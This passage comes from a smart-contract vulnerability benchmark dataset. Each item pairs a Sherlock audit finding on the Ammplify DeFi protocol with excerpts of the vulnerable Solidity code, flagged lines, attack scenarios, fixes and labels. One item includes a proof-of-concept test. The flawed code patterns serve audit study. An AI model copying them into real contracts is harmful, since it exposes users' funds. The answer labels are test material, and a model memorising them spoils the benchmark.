more than 0.01% (which is likely the case)\r\n\r\nInternal Pre-conditions\r\nThe position is within the JIT penalty time\r\nExternal Pre-conditions\r\nAttack Path\r\nUser creates a maker position\r\nFrontend queries View::queryAssetBalances in order to show the user how much they would be able to withdraw\r\nUser calls removeMaker through the frontend but receives less funds due to the JIT penalty\r\nImpact\r\nMedium impact:\r\n\r\nIssues that lead to getting incorrect return values (i.e. deviates from the withdrawal value of the asset by more than 0.01%) from the queryAssetBalance function (even if the appropriate input is used), which will lead to issues when executing other functions, may be considered valid with Medium severity at max.\r\n\r\nPoC\r\nNo response\r\n\r\nMitigation\r\nApply the JIT penalty to the view function for more realistic results\r\n\r\nDiscussion\r\nsherlock-admin2\r\n\r\nThe protocol team fixed this issue in the following PRs/commits:\r\nhttps://github.com/itos-finance/Ammplify/pull/26\r\n\r\nIssue M-13: NFTManager burnAsset always triggers JIT penalty on removal\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/365\r\n\r\nFound by\r\n0xHexed, 0xKemah, 0xapple, 0xnija, Edoscoba, HeckerTrieuTien, OxNoble, Slayer, VCeb, Ziusz, anonymousjoe, blockace, davuka, gh0xt, neeloy, r1ver, roshark, t.aksoy, theholymarvycodes, vtim\r\n\r\nSummary\r\nUpdating the asset’s timestamp inside MakerFacet.collectFees will cause an undue JIT penalty on removal for makers as NFTManager.burnAsset first calls collectFees (which resets timestamp) and then removeMaker. removeMaker computes lifetime from that just-reset timestamp, so the user loses a portion of principal upon burn even if the position has been held longer than jitLifetime.\r\n\r\nRoot Cause\r\nIn Maker.sol:147, collectFees() calls:\r\n\r\nfunction collectFees(...) {  \r\n    // [...]  \r\n    AssetLib.updateTimestamp(asset); // <-- Resets to block.timestamp  \r\n    // [...]  \r\n}  \r\n  \r\nfunction updateTimestamp(Asset storage asset) internal {  \r\n    asset.timestamp = uint128(block.timestamp);  \r\n}  \r\nIn Maker.sol:117, removeMaker() applies JIT penalty based on asset.timestamp:\r\n\r\nfunction removeMaker(...) {  \r\n    // [...]  \r\n    removedX = uint256(-data.xBalance); // These are definitely negative.  \r\n    removedY = uint256(-data.yBalance);  \r\n    (removedX, removedY) = FeeLib.applyJITPenalties(asset, removedX, removedY);  \r\n    AssetLib.removeAsset(assetId);  \r\n    // [...]  \r\n}  \r\nIn NFTManager.sol, burnAsset() is implemented as:\r\n\r\nfunction burnAsset(...) {  \r\n    // [...]  \r\n    (fees0, fees1) = MAKER_FACET.collectFees(...); // <-- Effectively resets timestamp  \r\n    (token0, token1, removedX, removedY) = MAKER_FACET.removeMaker(...); // <-- Uses just-reset timestamp  \r\n    // [...]  \r\n  \r\n    _burn(tokenId);  \r\n    emit AssetBurned(assetId, tokenId, msg.sender);  \r\n}  \r\nThis ordering guarantees duration < jitLifetime during removal in the same tx, applying penalty even for long-held positions.\r\n\r\nInternal Pre-conditions\r\nAdmin has set jitLifetime > 0 and jitPenaltyX64 > 0.\r\nA maker position exists and has been held longer than jitLifetime.\r\nExternal Pre-conditions\r\nNone.\r\n\r\nAttack Path\r\nUser holds a long-lived Maker NFT and wants to close via NFTManager.burnAsset().\r\nburnAsset first calls MakerFacet.collectFees(), which updates asset.timestamp to now.\r\nburnAsset then calls MakerFacet.removeMaker(), which checks duration = now - asset.timestamp = 0.\r\nFeeLib.applyJITPenalties applies the penalty to removedX/removedY even though the position was not JIT.\r\nImpact\r\nThe user suffers loss equal to the configured JIT penalty fraction on their withdrawn principal.\r\n\r\nPoC\r\nNo response\r\n\r\nMitigation\r\nDon't update the timestamp inside collectFees().\r\n\r\nDiscussion\r\nsherlock-admin2\r\n\r\nThe protocol team fixed this issue in the following PRs/commits:\r\nhttps://github.com/itos-finance/Ammplify/pull/27\r\n\r\nIssue M-14: Vaults won't work with tokens that revert on a 0 value approval\r\nSource: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/402\r\n\r\nThis issue has been acknowledged by the team but won't be fixed at this time.\r\n\r\nFound by\r\n0x37, VCeb, holtzzx, makarov\r\n\r\nSummary\r\n;\r\n\r\nRoot Cause\r\nThe README says current contracts in-scope shouldn't have issues with tokens that revert on a zero value approval\r\n\r\nHowever, we are not expected to have issues with:  \r\n...  \r\nRevert on Zero Value Approvals  \r\nThe traits listed above are in scope and the contracts are expected to work correctly with them. Users will be able to create pools with tokens with other weird traits, but if they malfunction, it’s considered an acceptable risk.  \r\nThe contract is expected to work with tokens that revert on zero value approvals, but that doesn't appear the case, as the following function on E4626\r\n\r\n    function commit(VaultE4626 storage self, VaultTemp memory temp) internal {  \r\n        uint256 assetsToDeposit = temp.vars[1];  \r\n        uint256 assetsToWithdraw = temp.vars[2];  \r\n  \r\n        if (assetsToDeposit > 0 && assetsToWithdraw > 0) {  \r\n            // We can net out and save ourselves some fees.  \r\n            if (assetsToDeposit > assetsToWithdraw) {  \r\n                assetsToDeposit -= assetsToWithdraw;  \r\n                assetsToWithdraw = 0;  \r\n            } else if (assetsToWithdraw > assetsToDeposit) {  \r\n                assetsToWithdraw -= assetsToDeposit;  \r\n                assetsToDeposit = 0;  \r\n            } else {  \r\n                // Perfect net!  \r\n                return;  \r\n            }  \r\n        }  \r\n  \r\n        if (assetsToDeposit > 0) {  \r\n            // Temporary approve the deposit.  \r\n            SafeERC20.forceApprove(self.token, address(self.vault), assetsToDeposit);  \r\n            self.totalVaultShares += self.vault.deposit(assetsToDeposit, address(this));  \r\n            SafeERC20.forceApprove(self.token, address(self.vault), 0);  \r\n        } else if (assetsToWithdraw > 0) {  \r\n            // We don't need to hyper-optimize the receiver.  \r\n            self.totalVaultShares -= self.vault.withdraw(assetsToWithdraw, address(this), address(this));  \r\n        }  \r\n    }  \r\nWe don't handle the case where the token registered on the VaultE4626 revert on a 0 approval, and we do\r\n\r\n            SafeERC20.forceApprove(self.token, address(self.vault), 0);     function transfer(address fromVault, address toVault, uint256 userId, uint256 amount) internal {  \r\n        VaultPointer memory from = getVault(fromVault);  \r\n        from.withdraw(userId, amount);  \r\n        from.commit();  \r\n        VaultPointer memory to = getVault(toVault);  \r\n        to.deposit(userId, amount);  \r\n        to.commit();  \r\n        emit VaultTransfer(fromVault, toVault);  \r\n    }  ",
            "vulnerable_lines": [
                20,
                21,
                22,
                23,
                24
            ],
            "vulnerable_functions": [
                "commit"
            ]
        },
        "context_files": [],
        "call_flow": "Vault.transfer -> commit -> deposit -> forceApprove(0) -> token reverts",
        "context_hint": "Token compatibility issue - certain tokens like BNB revert on zero-value approvals, but the vault always resets approval to 0 after operations, making these tokens incompatible despite protocol claims.",
        "is_vulnerable": true
    },
    {
        "id": "gs_sherlock_ammplify_M13",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "Ammplify",
        "source_finding_id": "M-13",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "medium",
        "vulnerability_type": "logic_error",
        "difficulty_tier": 2,
        "context_level": "cross_contract",
        "finding_title": "NFTManager burnAsset always triggers JIT penalty on removal",
        "finding_description": "Updating the asset's timestamp inside MakerFacet.collectFees will cause an undue JIT penalty on removal for makers as NFTManager.burnAsset first calls collectFees (which resets timestamp) and then removeMaker. removeMaker computes lifetime from that just-reset timestamp, so the user loses a portion of principal upon burn even if the position has been held longer than jitLifetime. The collectFees() function calls AssetLib.updateTimestamp(asset) which resets asset.timestamp to block.timestamp. Then removeMaker() applies JIT penalty based on asset.timestamp, and the burnAsset() implementation guarantees duration < jitLifetime during removal in the same tx, applying penalty even for long-held positions.",
        "attack_scenario": "1. User holds a long-lived Maker NFT and wants to close via NFTManager.burnAsset().\n2. burnAsset first calls MakerFacet.collectFees(), which updates asset.timestamp to now.\n3. burnAsset then calls MakerFacet.removeMaker(), which checks duration = now - asset.timestamp = 0.\n4. FeeLib.applyJITPenalties applies the penalty to removedX/removedY even though the position was not JIT.\n\nThe user suffers loss equal to the configured JIT penalty fraction on their withdrawn principal.",
        "fix_description": "Don't update the timestamp inside collectFees().",
        "primary_file": {
            "path": "Ammplify/src/facets/Maker.sol",
            "content": "function collectFees(...) {  \r\n    // [...]  \r\n    AssetLib.updateTimestamp(asset); // <-- Resets to block.timestamp  \r\n    // [...]  \r\n}  \r\n  \r\nfunction updateTimestamp(Asset storage asset) internal {  \r\n    asset.timestamp = uint128(block.timestamp);  \r\n}  function removeMaker(...) {  \r\n    // [...]  \r\n    removedX = uint256(-data.xBalance); // These are definitely negative.  \r\n    removedY = uint256(-data.yBalance);  \r\n    (removedX, removedY) = FeeLib.applyJITPenalties(asset, removedX, removedY);  \r\n    AssetLib.removeAsset(assetId);  \r\n    // [...]  \r\n}  function burnAsset(...) {  \r\n    // [...]  \r\n    (fees0, fees1) = MAKER_FACET.collectFees(...); // <-- Effectively resets timestamp  \r\n    (token0, token1, removedX, removedY) = MAKER_FACET.removeMaker(...); // <-- Uses just-reset timestamp  \r\n    // [...]  \r\n  \r\n    _burn(tokenId);  \r\n    emit AssetBurned(assetId, tokenId, msg.sender);  \r\n}  ",
            "vulnerable_lines": [
                117,
                147
            ],
            "vulnerable_functions": [
                "collectFees",
                "removeMaker"
            ]
        },
        "context_files": [
            {
                "path": "Ammplify/src/integrations/NFTManager.sol",
                "content": "// Content would need to be fetched from GitHub repo",
                "relevance": "Contains burnAsset() function that calls collectFees then removeMaker in sequence, creating the timestamp reset issue"
            }
        ],
        "call_flow": "NFTManager.burnAsset() -> MakerFacet.collectFees() -> updateTimestamp() -> MakerFacet.removeMaker() -> applyJITPenalties(with reset timestamp) -> incorrect penalty",
        "context_hint": "Timestamp manipulation through function call ordering - collectFees resets the timestamp before removeMaker checks it, causing the JIT penalty calculation to use duration of 0 instead of the actual position lifetime.",
        "is_vulnerable": true
    },
    {
        "id": "gs_sherlock_ammplify_M12",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "Ammplify",
        "source_finding_id": "M-12",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "medium",
        "vulnerability_type": "logic_error",
        "difficulty_tier": 2,
        "context_level": "single_file",
        "finding_title": "View::queryAssetBalances does not account for JIT penalties",
        "finding_description": "View::queryAssetBalances is used to query how much assets a user would receive if they were to withdraw their funds at the moment. However, the value returned will be wrong as it does not account for potential JIT penalties that the position might incur. When a user removes their maker position it calculates the amount of assets to return and then applies a JIT penalty if needed afterwards. However, when the view function is used it does not properly account for the JIT penalty. This would cause a mismatch between the 2 values of more than 0.01% as long as the JIT penalty is more than 0.01% (which is likely the case).",
        "attack_scenario": "1. User creates a maker position\n2. Frontend queries View::queryAssetBalances in order to show the user how much they would be able to withdraw\n3. User calls removeMaker through the frontend but receives less funds due to the JIT penalty\n\nThis leads to incorrect return values that deviate from the withdrawal value by more than 0.01%, causing issues when executing other functions.",
        "fix_description": "Apply the JIT penalty to the view function for more realistic results.",
        "primary_file": {
            "path": "Ammplify/src/facets/View.sol",
            "content": "    /// @inheritdoc IMaker  \r\n    function removeMaker(  \r\n        address recipient,  \r\n        uint256 assetId,  \r\n        uint160 minSqrtPriceX96,  \r\n        uint160 maxSqrtPriceX96,  \r\n        bytes calldata rftData  \r\n    ) external nonReentrant returns (address token0, address token1, uint256 removedX, uint256 removedY) {  \r\n        Asset storage asset = AssetLib.getAsset(assetId);  \r\n        require(asset.owner == msg.sender, NotMakerOwner(asset.owner, msg.sender));  \r\n        require(asset.liqType == LiqType.MAKER || asset.liqType == LiqType.MAKER_NC, NotMaker(assetId));  \r\n        PoolInfo memory pInfo = PoolLib.getPoolInfo(asset.poolAddr);  \r\n        Data memory data = DataImpl.make(pInfo, asset, minSqrtPriceX96, maxSqrtPriceX96, 0);  \r\n        WalkerLib.modify(pInfo, asset.lowTick, asset.highTick, data);  \r\n        // Settle balances.  \r\n        PoolWalker.settle(pInfo, asset.lowTick, asset.highTick, data);  \r\n        removedX = uint256(-data.xBalance); // These are definitely negative.  \r\n        removedY = uint256(-data.yBalance);  \r\n->      (removedX, removedY) = FeeLib.applyJITPenalties(asset, removedX, removedY);  //@audit JIT penalty applied to the full amount returned  \r\n        AssetLib.removeAsset(assetId);  \r\n        address[] memory tokens = pInfo.tokens();  \r\n        int256[] memory balances = new int256[](2);  \r\n        balances[0] = -int256(removedX); // We know they fit since they can only be less (in magnitude) than before.  \r\n        balances[1] = -int256(removedY);  \r\n        RFTLib.settle(recipient, tokens, balances, rftData);  \r\n        // Return values  \r\n        token0 = tokens[0];  \r\n        token1 = tokens[1];  \r\n    }      /// Compute the token balances owned/owed by the position.  \r\n    /// @dev We separate the fee and liq balance so we can use the same method for fee earnings and total value.  \r\n    /// @return netBalance0 The amount of token0 owed to the position owner sans fees (Negative is owed by the owner).  \r\n    /// @return netBalance1 The amount of token1 owed to the position owner sans fees (Negative is owed by the owner).  \r\n    /// @return fees0 The amount of fees in token0 owed to a maker or owed by a taker depending on the liq type.  \r\n    /// @return fees1 The amount of fees in token1 owed to a maker or owed by a taker depending on the liq type.  \r\n    function queryAssetBalances(  \r\n        uint256 assetId  \r\n    ) external view returns (int256 netBalance0, int256 netBalance1, uint256 fees0, uint256 fees1) {  \r\n        Asset storage asset = AssetLib.getAsset(assetId);  \r\n        PoolInfo memory pInfo = PoolLib.getPoolInfo(asset.poolAddr);  \r\n        ViewData memory data = ViewDataImpl.make(pInfo, asset);  \r\n        ViewWalkerLib.viewAsset(pInfo, asset.lowTick, asset.highTick, data);  \r\n        if (asset.liqType == LiqType.TAKER) {  \r\n            uint256 vaultX = VaultLib.balanceOf(pInfo.token0, asset.xVaultIndex, assetId, false);  \r\n            uint256 vaultY = VaultLib.balanceOf(pInfo.token1, asset.yVaultIndex, assetId, false);  \r\n            // Balance and fees are owed, and vault balance is owned.  \r\n            netBalance0 = int256(vaultX) - int256(data.liqBalanceX);  \r\n            netBalance1 = int256(vaultY) - int256(data.liqBalanceY);  \r\n            fees0 = data.earningsX;  \r\n            fees1 = data.earningsY;  \r\n        } else {                                                              //@audit missing JIT penalty  \r\n            netBalance0 = int256(data.liqBalanceX);  \r\n            netBalance1 = int256(data.liqBalanceY);  \r\n            fees0 = data.earningsX;  \r\n            fees1 = data.earningsY;  \r\n        }  \r\n    }  ",
            "vulnerable_lines": [
                74,
                75,
                76,
                77,
                78,
                79,
                80,
                81,
                82,
                83,
                84,
                85,
                86,
                87,
                88,
                89,
                90,
                91,
                92,
                93,
                94,
                95,
                96,
                97,
                98,
                99,
                100,
                101
            ],
            "vulnerable_functions": [
                "queryAssetBalances"
            ]
        },
        "context_files": [
            {
                "path": "Ammplify/src/facets/Maker.sol",
                "content": "// Content would need to be fetched from GitHub repo",
                "relevance": "Contains removeMaker function that applies JIT penalties, showing the correct flow that View should mirror"
            }
        ],
        "call_flow": "queryAssetBalances -> calculate balances -> return without JIT penalty vs removeMaker -> calculate balances -> apply JIT penalty -> return",
        "context_hint": "View function returns incomplete data - it calculates withdrawal amounts but doesn't apply the same JIT penalty logic that the actual removal function uses, causing frontend displays to show higher amounts than users will actually receive.",
        "is_vulnerable": true
    },
    {
        "id": "gs_sherlock_ammplify_M11",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "Ammplify",
        "source_finding_id": "M-11",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "medium",
        "vulnerability_type": "integer_overflow",
        "difficulty_tier": 3,
        "context_level": "cross_contract",
        "finding_title": "Wide cross-zero ranges revert (InvertedRange) due to sign-loss in tick→index and no wrap support",
        "finding_description": "TreeTickLib.tickToTreeIndex casts int→uint24 before adding the offset and never applies % rootWidth. RouteImpl.make reverts whenever _right < _left and does not accept wrapped intervals. For wide cross-zero ranges (e.g., [-k, +k] with k > rootWidth/2 * tickSpacing), left > right occurs and route construction reverts. Normal cross-zero bands succeed; the failure starts exactly at the threshold. The tickToTreeIndex function returns uint24(tick / tickSpacing) + rootWidth / 2 with cast-before-offset and no % rootWidth. The WalkerLib.modify builds the route without splitting wrapped spans.",
        "attack_scenario": "1. User calls a flow that computes route for [-k, +k] (wide cross-zero).\n2. TreeTickLib.tickToTreeIndex maps ticks so that leftIndex > rightIndex-1.\n3. Route construction RouteImpl.make(rootWidth, left, right) sees _right < _left and reverts InvertedRange.\n4. The walker bubbles the revert; the operation cannot proceed.\n\nOperational DoS of legitimate "very wide" cross-zero ranges: attempts to open/modify/close such ranges revert at route construction. This includes near-full-range on Uniswap v3–style pools when tickSpacing=60.",
        "fix_description": "Normalize indices after applying the signed offset (e.g., (q + rootWidth/2) % rootWidth) or accept wrap in RouteImpl.make or split wrapped spans in WalkerLib.modify before calling RouteImpl.make.",
        "primary_file": {
            "path": "Ammplify/src/tree/Tick.sol",
            "content": "return uint24(tick / tickSpacing) + rootWidth / 2; // cast-before-offset; no % rootWidth  function make(uint24 _rootWidth, uint24 _left, uint24 _right) internal pure returns (Route memory) {  \r\n        if (_right < _left) revert InvertedRange(_left, _right);  // SPDX-License-Identifier: BUSL-1.1  \r\npragma solidity ^0.8.27;  \r\n  \r\nimport { Test } from \"forge-std/Test.sol\";  \r\nimport { TickMath } from \"v4-core/libraries/TickMath.sol\";  \r\nimport { TreeTickLib } from \"src/tree/Tick.sol\";  \r\nimport { Route, RouteImpl } from \"src/tree/Route.sol\";  \r\n  \r\ncontract RouteInvoker {  \r\n    function make(uint24 rootWidth, uint24 left, uint24 right) external pure returns (Route memory) {  \r\n        return RouteImpl.make(rootWidth, left, right);  \r\n    }  \r\n}  \r\n  \r\nerror InvertedRange(uint24 left, uint24 right);  \r\n  \r\ncontract PoC_Tree_CrossZero is Test {  \r\n    int24 constant TICK_SPACING = 60;  \r\n  \r\n    RouteInvoker internal invoker;  \r\n  \r\n    struct CaseResult {  \r\n        int24 lowTick;  \r\n        int24 highTick;  \r\n        uint24 rootWidth;  \r\n        uint24 lowIndex;  \r\n        uint24 highIndexMinus1;  \r\n        bool lowGreaterThanHigh;  \r\n        bool routeReverted;  \r\n        bytes revertData;  \r\n    }  \r\n  \r\n    function setUp() public {  \r\n        invoker = new RouteInvoker();  \r\n    }  \r\n  \r\n    function _normalize(uint24 idx, uint24 rootWidth) internal pure returns (uint24) {  \r\n        return idx % rootWidth;  \r\n    }  \r\n  \r\n    /// @dev boundary (k = rootWidth/2 * spacing) succeeds; boundary+1 inverts & reverts.  \r\n    function test_crossZeroBoundary_thresholds() public {  \r\n        uint24 rootWidth = TreeTickLib.calcRootWidth(TickMath.MIN_TICK, TickMath.MAX_TICK, TICK_SPACING);  \r\n        uint24 half = rootWidth / 2;  \r\n  \r\n        // boundary = half*spacing  → should NOT invert (wrap lands inside [0,rootWidth))  \r\n        int24 k0 = int24(int256(uint256(half))) * TICK_SPACING;  \r\n        CaseResult memory c0 = _runCase(rootWidth, -k0, k0);  \r\n        assertFalse(c0.lowGreaterThanHigh, \"boundary case must not invert\");  \r\n        assertFalse(c0.routeReverted, \"Route.make must succeed at boundary\");  \r\n  \r\n        // boundary+1 → inversion: lowIndex > highIndexMinus1, Route.make reverts InvertedRange  \r\n        int24 k1 = int24(int256(uint256(half + 1))) * TICK_SPACING;  \r\n        CaseResult memory c1 = _runCase(rootWidth, -k1, k1);  \r\n        assertTrue(c1.lowGreaterThanHigh, \"boundary+1 must invert\");  \r\n        assertTrue(c1.routeReverted, \"Route.make must revert (InvertedRange) at boundary+1\");  \r\n    }  \r\n  \r\n    /// @dev raw route reverts, but splitting into two wrapped routes ([left..rootWidth-1] and [0..right]) both succeed.  \r\n    function test_wrappedNormalization_succeeds() public {  \r\n        uint24 rootWidth = TreeTickLib.calcRootWidth(TickMath.MIN_TICK, TickMath.MAX_TICK, TICK_SPACING);  \r\n        uint24 half = rootWidth / 2;  \r\n        int24 k1 = int24(int256(uint256(half + 1))) * TICK_SPACING;  \r\n  \r\n        // Raw indices (as used today) → invert & revert  \r\n        CaseResult memory rawCase = _runCase(rootWidth, -k1, k1);  \r\n        assertTrue(rawCase.lowGreaterThanHigh && rawCase.routeReverted, \"raw must invert & revert\");  \r\n  \r\n        // Normalized indices (wrap-aware): split into two segments if left > right  \r\n        uint24 leftNorm = rawCase.lowIndex % rootWidth;  \r\n        uint24 rightNormMinus1 = rawCase.highIndexMinus1 % rootWidth;  \r\n  \r\n        if (leftNorm <= rightNormMinus1) {  \r\n            // no wrap; single route must succeed  \r\n            (bool ok, ) = _callMake(rootWidth, leftNorm, rightNormMinus1);  \r\n            assertTrue(ok, \"single normalized route should succeed\");  \r\n        } else {  \r\n            // wrap; two routes must each succeed  \r\n            (bool ok1, ) = _callMake(rootWidth, leftNorm, rootWidth - 1);  \r\n            (bool ok2, ) = _callMake(rootWidth, 0, rightNormMinus1);  \r\n            assertTrue(ok1 && ok2, \"wrapped normalized routes should both succeed\");  \r\n        }  \r\n    }  \r\n  \r\n    function _callMake(uint24 rootWidth, uint24 left, uint24 right) internal returns (bool ok, bytes memory data) {  \r\n        (ok, data) = address(invoker).call(abi.encodeWithSelector(RouteInvoker.make.selector, rootWidth, left, right));  \r\n    }  \r\n  \r\n    function _runCase(  \r\n        uint24 rootWidth,  \r\n        int24 lowTick,  \r\n        int24 highTick  \r\n    ) internal view returns (CaseResult memory result) {  \r\n        result.lowTick = lowTick;  \r\n        result.highTick = highTick;  \r\n        result.rootWidth = rootWidth;  \r\n  \r\n        uint24 lowIndex = TreeTickLib.tickToTreeIndex(lowTick, rootWidth, TICK_SPACING);  \r\n        uint24 highIndex = TreeTickLib.tickToTreeIndex(highTick, rootWidth, TICK_SPACING);  \r\n        uint24 highMinusOne = highIndex - 1;  \r\n  \r\n        result.lowIndex = lowIndex;  \r\n        result.highIndexMinus1 = highMinusOne;  \r\n        result.lowGreaterThanHigh = lowIndex > highMinusOne;  \r\n  \r\n        try invoker.make(rootWidth, lowIndex, highMinusOne) returns (Route memory) {  \r\n            result.routeReverted = false;  \r\n        } catch (bytes memory revertData) {  \r\n            result.routeReverted = true;  \r\n            result.revertData = revertData;  \r\n        }  \r\n    }  \r\n}  ",
            "vulnerable_lines": [
                6,
                7,
                8,
                9,
                10,
                11
            ],
            "vulnerable_functions": [
                "tickToTreeIndex"
            ]
        },
        "context_files": [
            {
                "path": "Ammplify/src/tree/Route.sol",
                "content": "// Content would need to be fetched from GitHub repo",
                "relevance": "Contains RouteImpl.make that reverts on inverted ranges without handling wrap-around"
            },
            {
                "path": "Ammplify/src/walkers/Lib.sol",
                "content": "// Content would need to be fetched from GitHub repo",
                "relevance": "Contains WalkerLib.modify that builds routes without splitting wrapped spans"
            }
        ],
        "call_flow": "User operation -> WalkerLib.modify -> TreeTickLib.tickToTreeIndex -> uint24 overflow -> RouteImpl.make -> InvertedRange revert",
        "context_hint": "Sign loss in type conversion combined with modular arithmetic issue - when converting negative ticks to uint24 indices, very wide ranges cause the left index to be numerically greater than the right index, triggering an inverted range error. This is an edge case that blocks legitimate full-range positions.",
        "is_vulnerable": true
    },
    {
        "id": "gs_sherlock_ammplify_M10",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "Ammplify",
        "source_finding_id": "M-10",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "medium",
        "vulnerability_type": "standards_violation",
        "difficulty_tier": 1,
        "context_level": "single_file",
        "finding_title": "Incompatible library used for Fee on Transfer tokens",
        "finding_description": "From the competition details, the protocol is expected to work correctly with 'Transfer of less than amount' tokens (fee-on-transfer tokens). However, the protocol adopts the RFT library which is incompatible with tokens that have a fee on transfer. The library has a strict validation check that requires actualDeltas[i] >= balanceChanges[i]. When the library tries to transfer fee-on-transfer tokens, the actual deltas will always be less than balanceChanges therefore the protocol will always revert for any fee on transfer token.",
        "attack_scenario": "1. User holds fee-on-transfer tokens that the protocol explicitly claims to support.\n2. User attempts to create a maker position by calling newMaker() or similar functions\n3. Protocol attempts to transfer tokens through RFTLib.settle()\n4. Fee-on-transfer token deducts transfer fee e.g. 2% of transfer amount\n5. Protocol receives less tokens than expected due to fee deduction\n6. RFTLib validation fails with InsufficientReceive error, reverting the transaction\n7. User cannot create any positions with fee-on-transfer tokens despite protocol's compatibility claims\n\nDenial of service for any token that has a fee on transfer, a capability that should be possible based on the competition details.",
        "fix_description": "Implement proper fee-on-transfer token handling in the settlement system or use a different library. Alternatively, do not allow fee on transfer tokens in the protocol.",
        "primary_file": {
            "path": "Ammplify/src/facets/Maker.sol",
            "content": "        actualDeltas = new int256[](tokens.length);  \r\n        for (uint256 i = 0; i < tokens.length; ++i) {  \r\n            address token = tokens[i];  \r\n  \r\n            // Validate our balances.  \r\n            uint256 finalBalance = IERC20(token).balanceOf(address(this));  \r\n            actualDeltas[i] = U256Ops.sub(finalBalance, startBalances[i]);  \r\n            if (actualDeltas[i] < balanceChanges[i]) {  \r\n                revert InsufficientReceive(token, balanceChanges[i], actualDeltas[i]);  \r\n            }  ",
            "vulnerable_lines": [
                49
            ],
            "vulnerable_functions": [
                "newMaker",
                "RFTLib.settle"
            ]
        },
        "context_files": [],
        "call_flow": "newMaker -> RFTLib.settle -> token transfer with fee -> balance check fails -> InsufficientReceive revert",
        "context_hint": "Token compatibility issue - the RFT library has strict balance validation that doesn't account for transfer fees, causing all fee-on-transfer token operations to revert despite protocol claims of compatibility.",
        "is_vulnerable": true
    },
    {
        "id": "gs_sherlock_ammplify_M9",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "Ammplify",
        "source_finding_id": "M-9",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "medium",
        "vulnerability_type": "integer_overflow",
        "difficulty_tier": 2,
        "context_level": "single_file",
        "finding_title": "Unchecked Underflow in TreeTickLib Causes Transaction Revert in Route Creation",
        "finding_description": "Unchecked arithmetic underflow in TreeTickLib.sol causes a transaction revert for users attempting to modify pool positions, as the system generates an invalid tree index that triggers a failure in the RouteImpl.make function's range validation. In tickToTreeIndex function, the calculation uint24(tick / tickSpacing) + rootWidth / 2 is performed inside an unchecked block. When tick / tickSpacing is sufficiently negative (e.g., less than -rootWidth / 2), the cast uint24(tick / tickSpacing) converts the negative result to a large positive value due to underflow (e.g., -524,289 becomes 16,252,927). Adding rootWidth / 2 to this does not cause another underflow but rather produces an incorrect tree index.",
        "attack_scenario": "1. A user initiates a pool position update by calling WalkerLib.modify with a valid negative lowTick (e.g., -524,289), a valid highTick (e.g., -200,000), tickSpacing = 1, and rootWidth = 524,288.\n2. The modify function calls PoolInfoImpl.treeTick for both ticks, which invokes TreeTickLib.tickToTreeIndex.\n3. For lowTick = -524,289, tickToTreeIndex computes tick / tickSpacing = -524,289. The cast uint24(-524,289) underflows to 2^24 - 524,289 = 16,252,927. Adding rootWidth / 2 yields 16,515,071.\n4. For highTick = -200,000, similar underflow occurs resulting in incorrect index.\n5. The modify function passes these indices to RouteImpl.make where the validation fails and reverts with InvertedRange error.\n\nUsers cannot successfully execute the modify function to update pool positions, effectively disabling the core functionality of the protocol.",
        "fix_description": "No mitigation provided in the report.",
        "primary_file": {
            "path": "Ammplify/src/tree/Tick.sol",
            "content": "function tickToTreeIndex(int24 tick, uint24 rootWidth, int24 tickSpacing) internal pure returns (uint24) {  \r\n    unchecked {  \r\n        require(tick % tickSpacing == 0, UnalignedTick(tick, tickSpacing));  \r\n        return uint24(tick / tickSpacing) + rootWidth / 2; // Underflow occurs here if result is negative  \r\n    }  \r\n}  function modify(PoolInfo memory pInfo, int24 lowTick, int24 highTick, Data memory data) internal {  \r\n    uint24 low = pInfo.treeTick(lowTick); // Calls treeTick with lowTick  \r\n    uint24 high = pInfo.treeTick(highTick) - 1; // Calls treeTick with highTick  \r\n    Route memory route = RouteImpl.make(pInfo.treeWidth, low, high);  \r\n    route.walk(down, up, phase, toRaw(data));  \r\n}  function treeTick(PoolInfo memory self, int24 tick) internal pure returns (uint24) {  \r\n    return TreeTickLib.tickToTreeIndex(tick, self.treeWidth, self.tickSpacing);  \r\n}  function make(uint24 _rootWidth, uint24 _left, uint24 _right) internal pure returns (Route memory) {  \r\n    if (_right < _left) revert InvertedRange(_left, _right); // Reverts here  \r\n}  ",
            "vulnerable_lines": [
                9
            ],
            "vulnerable_functions": [
                "tickToTreeIndex"
            ]
        },
        "context_files": [],
        "call_flow": "WalkerLib.modify -> PoolInfoImpl.treeTick -> TreeTickLib.tickToTreeIndex -> uint24 cast underflow -> RouteImpl.make -> InvertedRange revert",
        "context_hint": "Unchecked arithmetic in type casting - negative tick values are cast to uint24 before adding offset, causing underflow that produces astronomically large indices that fail downstream range validation.",
        "is_vulnerable": true
    },
    {
        "id": "gs_sherlock_ammplify_M8",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "sherlock",
        "source_report": "Ammplify",
        "source_finding_id": "M-8",
        "report_url": "https://audits.sherlock.xyz/audits/contests/1054",
        "github_repo_url": "https://github.com/sherlock-audit/2025-09-ammplify-judging",
        "contest_date": "2025-09-01",
        "severity": "medium",
        "vulnerability_type": "logic_error",
        "difficulty_tier": 3,
        "context_level": "single_file",
        "finding_title": "Can't remove compounding maker asset if any visit node in route has only liquidity for it",
